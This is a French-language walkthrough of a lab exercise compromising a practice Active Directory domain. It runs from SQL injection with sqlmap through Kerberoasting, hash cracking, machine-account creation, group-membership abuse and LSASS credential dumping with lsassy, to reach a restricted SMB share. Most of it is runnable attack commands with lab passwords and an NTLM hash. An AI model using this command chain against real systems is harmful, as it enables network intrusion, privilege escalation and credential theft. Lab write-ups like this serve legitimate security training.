Tout d'abord pour demader le vpn

sudo openvpn --config akil.ovpn

sudo route -n add -net 192.168.40.0/24 -interface utun3


Ensuite voici a quoi ressemble mon /etc/hosts

![Capture d’écran 2024-11-14 à 16 00 35](https://github.com/user-attachments/assets/09392315-4757-494f-98ab-cc74ef0e38c4)

À partir de là, on utilise sqlmap pour tester une injection SQL sur le site web interne. La commande suivante permet d'obtenir le schéma de la base de données :

sqlmap -u "http://internal.vuln.lab/index.php?page=profil.php&id=5" --cookie="PHPSESSID=231iferbmflpia398nc649doua" --schema --batch

![Capture d’écran 2024-11-14 à 16 03 56](https://github.com/user-attachments/assets/35b4f2ff-e3df-47bf-9a11-eeb170d514d1)

Ensuite, on extrait le contenu de la table users, ce qui nous permet de récupérer le mot de passe d'Alice :

sqlmap -u "http://internal.vuln.lab/index.php?page=profil.php&id=5" --cookie="PHPSESSID=231iferbmflpia398nc649doua" --dump -T users --batch

![Capture d’écran 2024-11-14 à 16 04 11](https://github.com/user-attachments/assets/69f89746-4eb2-400b-9b2c-95bbfe82187d)


Ainsi, le mot de passe d'Alice (p@ssword) est obtenu.

En poursuivant, nous réalisons un Kerberoasting pour récupérer les tickets Kerberos des comptes de service :

nxc ldap 192.168.40.127 -u 'Alice.mice' -p 'p@ssword' -d 'vuln.lab' --kerberoasting kerberoasting.txt

![Capture d’écran 2024-11-14 à 16 05 41](https://github.com/user-attachments/assets/18a9f071-ea3f-4912-8ce9-0898fb7fd9ff)

Le hash obtenu correspond à svc_srv. Nous allons donc essayer de cracker ce hash pour obtenir le mot de passe en clair.


Avec hashcat, on utilise le mode 13100 pour casser le hash :

hashcat -m 13100 -a 0 kerberoasting.txt passwords.txt 

![Capture d’écran 2024-11-14 à 16 06 30](https://github.com/user-attachments/assets/78dff516-e728-4e94-b740-ad684e7d4bea)


Il est également possible d’utiliser John The Ripper pour obtenir le mot de passe:

john --format=krb5tgs --wordlist=passwords.txt kerberoasting.txt

![Capture d’écran 2024-11-14 à 16 07 07](https://github.com/user-attachments/assets/5c67de6d-ce53-4c7e-8c75-ed773514a771)

Le mot de passe de svc_srv est donc trouvé : qwerty123.


Ensuite, on vérifie les permissions disponibles pour Alice sur le partage SMB :

nxc smb DC01.VULN.LAB -u 'Alice.mice' -p 'p@ssword' -d 'vuln.lab' --dns-server 192.168.40.127 --shares

![Capture d’écran 2024-11-14 à 16 07 49](https://github.com/user-attachments/assets/f41a0246-073b-4d76-9d7f-fdb8e5f12b27)

Bien qu'elle ait accès à certains partages, l'accès au dossier CurriculumVitae, qui nous intéresse, lui est refusé.


Pour contourner cette restriction, on utilise Alice pour créer un compte machine appelé akil :

bloodyAD -u Alice.mice -p 'p@ssword' -d vuln.lab --host vuln.lab --dc-ip 192.168.40.127 add computer akil 'Password!'

![Capture d’écran 2024-11-14 à 16 22 31](https://github.com/user-attachments/assets/0449e44f-cec3-4329-9dae-79f16989f45a)


Pour analyser et visualiser les permissions dans Active Directory, on utilise BloodHound avec Alice :

bloodhound-python -c All -u 'Alice.mice' -p 'p@ssword' -d vuln.lab -ns 192.168.40.127

curl -L https://ghst.ly/getbhce | sudo docker compose -f - up


Ensuite, on se connecte à l'interface BloodHound via "http://127.0.0.1:8080/ui/explore".

Les fichier .json générés seront mis dans l'onglet Administration de bloodHound.


Avec les privilèges de svc_srv, on ajoute le compte akil dans le groupe server_admins, ce qui lui octroie des droits administratifs sur les serveurs :

bloodyAD -u svc_srv -p 'qwerty123' -d vuln.lab --host 192.168.40.127 --dc-ip 192.168.40.127 add groupMember server_admins 'akil$'

![Capture d’écran 2024-11-14 à 16 18 53](https://github.com/user-attachments/assets/130f4146-5860-4b89-9b8d-fee75317247d)


Nous vérifions ensuite qu’akil a bien les permissions nécessaires pour accéder aux informations d'un compte administrateur :

![Capture d’écran 2024-11-14 à 16 25 48](https://github.com/user-attachments/assets/ddbc54c1-8d21-472d-b924-f6a1cbb659f9)


Ensuite grace a cette commande on a pu avoir acces au mot de passe hasher de srv_neccus en utilisant lsassy:

 nxc smb SRV01.VULN.LAB -u 'akil$' -p 'Password!' -M lsassy
 
 ![Capture d’écran 2024-11-14 à 16 29 17](https://github.com/user-attachments/assets/387278f6-bb8d-4cc5-af39-159c391a525f)

Grâce à ce hash, on peut ajouter akil au groupe human_resources car, d’après BloodHound, svc_nessus, via le groupe administrative_groups, a la possibilité d’ajouter des membres dans human_resources :

<img width="1433" alt="Capture d’écran 2024-11-14 à 16 32 51" src="https://github.com/user-attachments/assets/5a76fe09-2541-4a3d-8312-3191dc30c77a">

bloodyAD -u svc_nessus -p ':e3cddc751fabf3eed53f904d85b1a0ba' -d vuln.lab --host 192.168.40.127 --dc-ip 192.168.40.127 add groupMember "human_resources" 'akil$'

![Capture d’écran 2024-11-14 à 16 33 32](https://github.com/user-attachments/assets/f639e056-1639-497d-9524-839bd37389b3)


Finalement, on accède au partage CurriculumVitae en utilisant akil avec les droits nécessaires :

nxc smb DC01.VULN.LAB -u 'akil$' -p 'Password!' -d 'vuln.lab' --dns-server 192.168.40.127 --shares 

![Capture d’écran 2024-11-14 à 16 35 17](https://github.com/user-attachments/assets/3956ac70-d6a7-4178-8676-13dca51c6e89)

![Capture d’écran 2024-11-14 à 16 35 53](https://github.com/user-attachments/assets/ecca4a57-8a0c-43f9-beb8-e13a60674b57)


 

 









